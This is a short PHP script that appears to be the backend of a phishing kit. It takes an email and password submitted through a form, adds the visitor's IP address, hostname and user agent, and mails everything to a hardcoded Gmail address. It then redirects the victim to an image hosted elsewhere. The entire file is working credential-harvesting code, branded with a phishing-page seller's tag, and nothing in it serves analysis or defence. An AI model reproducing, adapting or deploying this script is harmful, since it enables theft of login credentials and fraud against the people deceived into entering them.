<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| SKP:pa3kap3l (AMG) |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- FUDPAGES [.] RU --------------|\n";
$send = "robartoe90@gmail.com";
$subject = "Login :Mon3y (More Hit) | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://i.gyazo.com/049bc4624875e35c9a678af7eb99bb95.jpg");
}else{
header ("Location: https://i.gyazo.com/049bc4624875e35c9a678af7eb99bb95.jpg");
}

?>